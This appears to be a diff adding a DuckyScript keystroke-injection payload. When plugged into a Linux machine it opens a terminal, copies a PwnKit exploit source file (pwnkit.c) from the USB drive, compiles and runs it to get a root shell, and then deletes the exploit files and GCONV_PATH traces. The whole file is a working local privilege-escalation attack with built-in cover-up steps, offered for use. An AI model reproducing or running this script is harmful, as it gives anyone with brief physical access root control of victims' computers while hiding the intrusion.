@@ -1,0 +1,30 @@
+CTRL ALT t
+DELAY 750
+STRING setxkbmap de
+ENTER
+DELAY 100
+STRING USERNAME=$(whoami)
+ENTER
+STRING MOUNT_POINT="/media/$USERNAME/$(ls /media/$USERNAME/ | head -1)"
+ENTER
+DELAY 100
+STRING cp "$MOUNT_POINT/pwnkit.c" /tmp/pwnkit.c
+ENTER
+DELAY 200
+STRING gcc /tmp/pwnkit.c -o /tmp/pwnkit
+ENTER
+DELAY 200
+STRING /tmp/pwnkit
+ENTER
+DELAY 100
+STRING bash -l
+ENTER
+DELAY 100
+STRING rm /tmp/pwnkit.c /tmp/pwnkit
+ENTER
+DELAY 100
+STRING rm -rf GCONV_PATH=. pwnkit
+ENTER
+DELAY 100
+STRING whoami
+ENTER
